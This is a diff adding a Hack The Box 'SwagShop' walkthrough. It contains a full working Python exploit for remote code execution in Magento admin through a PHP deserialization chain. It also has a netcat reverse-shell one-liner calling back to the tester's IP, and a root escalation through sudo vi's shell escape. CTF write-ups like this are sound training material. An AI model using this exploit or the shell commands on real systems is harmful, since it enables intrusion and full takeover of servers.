@@ -417,3 +417,207 @@ Traceback (most recent call last):
     return _compile(pattern, flags).search(string)
 TypeError: cannot use a string pattern on a bytes-like object
 ```
+
+Finally after a ton modification to the exploit and spending couple of hours, I was able to modify the exploit correctly to give me the required results.
+
+```python
+
+from hashlib import md5
+import sys
+import re
+import base64
+import mechanize
+
+
+def usage():
+    print("Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\"")
+    sys.exit()
+
+
+if len(sys.argv) != 3:
+    usage()
+
+# Command-line args
+target = sys.argv[1]
+arg = sys.argv[2]
+
+# Config.
+username = 'ypwq'
+password = '123'
+php_function = 'system'  # Note: we can only pass 1 argument to the function
+install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
+install_date = bytes(install_date, 'utf-8')
+
+# POP chain to pivot into call_user_exec
+payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
+          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
+          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
+          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
+          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
+          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
+                                                                                     len(arg), arg)
+
+payload = payload.encode("ascii")
+# Setup the mechanize browser and options
+br = mechanize.Browser()
+#br.set_proxies({"http": "localhost:8080"})
+#br.set_handle_robots(False)
+
+request = br.open(target)
+br.select_form(nr=0)
+userone = br.find_control(name="login[username]", nr=0)
+userone.value = username
+pwone = br.find_control(name="login[password]", nr=0)
+pwone.value = password
+
+br.method = "POST"
+request = br.submit()
+content = request.read()
+
+url = re.search("ajaxBlockUrl = \'(.*)\'", content.decode("utf-8"))
+url = url.group(1)
+
+key = re.search("var FORM_KEY = '(.*)'", content.decode("utf-8"))
+key = key.group(1)
+
+request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
+tunnel = re.search("src=\"(.*)\?ga=", request.read().decode("utf-8"))
+tunnel = tunnel.group(1)
+
+payload = base64.b64encode(payload)
+#payload = payload.decode("ascii")
+
+#print("type check", type(payload))
+gh = md5(payload + install_date).hexdigest()
+
+payload = payload.decode()
+exploit = tunnel + '?ga=' + payload + '&h=' + gh
+
+
+try:
+    request = br.open(exploit)
+except (mechanize.HTTPError, mechanize.URLError) as e:
+    print(e.read().decode())
+
+```
+
+__NOTE__: If you're getting an error while running the code from the searchsploit module, it's probably because some part of the code is in bytes while the other part of the code is in strings. It took a lot of time for me to figure this out. The most important thing is, use `'http://swagshop/index.php/admin'` instead of `http://10.10.10.140/index.php/admin'` or else you'll get error for the `group` function. Just use the above mentioned script to avoid any such issues.
+
+Now that the script was working fine, I ran it to get the `id` of the machine.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
+└─$ python magento_rce-2.py http://swagshop.htb/index.php/admin "id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Then, I used this script to get a reverse shell to my machine.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
+└─$ python magento_rce.py 'http://10.10.10.140/index.php/admin' "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f" 
+```
+
+Started a `netcat` listener on port `4444`
+
+```
+nc -lvnp 4444
+```
+
+And got back a shell instantly.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.47] from (UNKNOWN) [10.10.10.140] 54634
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+
+Upgrading the shell using python, but I wasn't able to upgrade it.
+
+```
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+/bin/sh: 2: python: not found
+$ which python
+```
+
+Grabbing the user flag.
+
+```
+$ pwd
+/var/www/html
+$ cd ../../..
+$ cd home
+ls$ 
+haris
+$ cd haris
+$ ls
+user.txt
+$ cat user.txt
+[REDACTED]
+```
+
+# Privilege Escalation
+`sudo -l` shows I can run sudo with no password on `vi` in the `web dir`:
+
+
+```
+$ sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+```
+
+The fastest path to the flag is just to open it with `vi`. Based on the sudo output above, I’ll run:
+```
+$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
+Vim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+
+E558: Terminal entry not found in terminfo
+'unknown' not known. Available builtin terminals are:
+    builtin_amiga
+    builtin_beos-ansi
+    builtin_ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_debug
+    builtin_dumb
+defaulting to 'ansi'
+[REDACTED]
+
+```
+
+Of course I want a shell. so I opened a non-existing file with 
+```www-data@swagshop:/home/haris$ sudo /usr/bin/vi /var/www/html/a```
+
+Added the following code into the file.
+
+```
+:set shell=/bin/sh
+:shell
+```
+
+And we get a root shell
+```
+root@swagshop:/home/haris# cat /root/root.txt 
+[REDACTED]
+
+   ___ ___
+ /| |/|\| |\
+/_| ´ |.` |_\           We are open! (Almost)
+  |   |.  |
+  |   |.  |         Join the beta HTB Swag Store!
+  |___|.__|       https://hackthebox.store/password
+
+                   PS: Use root flag as password!
+```
